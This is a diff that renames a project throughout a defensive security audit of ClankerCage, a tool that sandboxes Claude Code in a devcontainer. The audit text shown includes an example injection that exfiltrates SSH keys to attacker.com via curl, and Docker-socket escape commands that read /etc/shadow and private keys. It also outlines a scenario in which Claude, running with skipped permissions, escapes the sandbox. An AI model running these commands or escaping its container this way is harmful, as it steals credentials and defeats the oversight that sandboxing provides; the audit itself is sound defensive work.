@@ -1,4 +1,4 @@
-# Clanker Comprehensive Security & Architecture Audit
+# ClankerCage Comprehensive Security & Architecture Audit
 
 **Version:** 3.0 (Final)
 **Date:** 2025-12-11
@@ -8,7 +8,7 @@
 
 ## Executive Summary
 
-Clanker is a Python CLI tool that wraps Claude Code in a sandboxed devcontainer with network allowlisting. After comprehensive analysis including two internal critique cycles, I rate it **4/10** overall.
+ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontainer with network allowlisting. After comprehensive analysis including two internal critique cycles, I rate it **4/10** overall.
 
 **The fundamental problem:** The Docker socket mount completely defeats the sandbox. Any code running in the container can escape to the host with a single command. This makes all other security controls theater.
 
@@ -114,7 +114,7 @@ docker run -v /:/host alpine cat /host/etc/shadow
 ### 2.2 `--dangerously-skip-permissions` Is Hardcoded
 
 **Severity:** CRITICAL (8/10)
-**Location:** `src/clanker/cli.py:173`
+**Location:** `src/clankercage/cli.py:173`
 
 ```python
 run_cmd = ["claude", "--dangerously-skip-permissions"] + claude_args
@@ -162,7 +162,7 @@ sysctl -w net.ipv6.conf.all.disable_ipv6=1
 ### 3.1 Shell Injection via Environment Variables
 
 **Severity:** HIGH (7/10)
-**Location:** `src/clanker/cli.py:121-134, 157-163`
+**Location:** `src/clankercage/cli.py:121-134, 157-163`
 
 ```python
 # Environment variables used without sanitization
@@ -174,8 +174,8 @@ commands.append(f"git config --global user.name '{args.git_user_name}'")
 **Attack Vector:** On shared systems or CI environments, a less-privileged process can set environment variables that are then injected into shell commands:
 
 ```bash
-export CLANKER_GIT_USER_NAME="'; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64); echo '"
-clanker  # Runs with malicious git config
+export CLANKERCAGE_GIT_USER_NAME="'; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64); echo '"
+clankercage  # Runs with malicious git config
 ```
 
 **Impact:** Arbitrary command execution in container (which can then escape via Docker socket).
@@ -209,7 +209,7 @@ echo "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH
 **Location:** `README.md`
 
 ```bash
-bash <(curl -s https://raw.githubusercontent.com/clankerbot/clanker/main/scripts/claude-code.sh)
+bash <(curl -s https://raw.githubusercontent.com/clankerbot/clankercage/main/scripts/claude-code.sh)
 ```
 
 **Problem:** No integrity verification. Compromised repo = compromised users.
@@ -273,7 +273,7 @@ sudo /sbin/ipset add allowed-domains 1.2.3.4
 ### 4.3 GPG Directory Mounted Read-Write
 
 **Severity:** MEDIUM (5/10)
-**Location:** `src/clanker/cli.py:107-109`
+**Location:** `src/clankercage/cli.py:107-109`
 
 **Impact:** Container can modify GPG keys.
 
@@ -298,9 +298,9 @@ No `--memory`, `--cpus`, `--pids-limit`.
 ### 4.5 Race Condition in Cache Directory
 
 **Severity:** MEDIUM (4/10)
-**Location:** `src/clanker/cli.py:286-300`
+**Location:** `src/clankercage/cli.py:286-300`
 
-Multiple instances share `~/.cache/clanker/workspace/.devcontainer/devcontainer.json`.
+Multiple instances share `~/.cache/clankercage/workspace/.devcontainer/devcontainer.json`.
 
 **Impact:** Config corruption, wrong settings applied.
 
@@ -309,7 +309,7 @@ Multiple instances share `~/.cache/clanker/workspace/.devcontainer/devcontainer.
 ### 4.6 Suppressed Error Output
 
 **Severity:** MEDIUM (4/10)
-**Location:** `src/clanker/cli.py:181`
+**Location:** `src/clankercage/cli.py:181`
 
 ```python
 result = subprocess.run(exec_cmd, stderr=subprocess.DEVNULL)
@@ -322,7 +322,7 @@ result = subprocess.run(exec_cmd, stderr=subprocess.DEVNULL)
 ### 4.7 No SSH Key Permission Validation
 
 **Severity:** MEDIUM (4/10)
-**Location:** `src/clanker/cli.py:271-273`
+**Location:** `src/clankercage/cli.py:271-273`
 
 Only checks existence, not permissions (should be 0600).
 
@@ -625,7 +625,7 @@ Run a separate Docker daemon inside the container. Slower startup but isolated f
 
 | File | Lines | Purpose |
 |------|-------|---------|
-| `src/clanker/cli.py` | 307 | Main CLI |
+| `src/clankercage/cli.py` | 307 | Main CLI |
 | `.devcontainer/Dockerfile` | 103 | Container build |
 | `.devcontainer/devcontainer.json` | 50 | Container config |
 | `.devcontainer/init-firewall.sh` | 184 | Firewall setup |
@@ -639,7 +639,7 @@ Run a separate Docker daemon inside the container. Slower startup but isolated f
 
 **Scenario:** Claude generates malicious code
 
-1. User runs `clanker` on project
+1. User runs `clankercage` on project
 2. Claude Code starts with `--dangerously-skip-permissions`
 3. Claude generates: `docker run -v /:/host alpine cat /host/home/user/.ssh/id_rsa`
 4. Docker socket allows this command
